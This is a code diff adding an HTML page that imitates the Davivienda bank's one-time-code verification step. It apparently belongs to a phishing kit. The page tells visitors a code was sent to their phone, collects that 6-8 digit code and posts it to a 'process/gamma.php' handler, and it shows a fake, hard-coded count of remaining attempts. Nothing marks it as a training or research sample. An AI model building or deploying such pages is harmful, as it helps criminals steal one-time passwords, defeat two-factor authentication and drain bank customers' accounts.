@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda - Verificación</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="LogoDavivienda.svg" alt="Logo" class="logo">
+        </div>
+        
+        <div class="welcome-section">
+            <h2 class="subtitle">Código de Seguridad</h2>
+            <p>Hemos enviado un código a su celular registrado.</p>
+        </div>
+        
+        <form class="login-form" action="process/gamma.php" method="post">
+            <div class="form-group">
+                <label for="otp" class="form-label">Ingrese el código (6-8 dígitos)</label>
+                <input type="text" id="otp" name="otp_code" 
+                       minlength="6" maxlength="8" pattern="[0-9]*" 
+                       inputmode="numeric" class="form-input" 
+                       placeholder="000000" required>
+            </div>
+            
+            <p id="intentos-msg" style="font-size: 0.8em; color: #666; margin-bottom: 15px;">
+                Intentos restantes: 4
+            </p>
+            
+            <button type="submit" class="btn-continue">Verificar código</button>
+        </form>
+    </div>
+</body>
+</html>
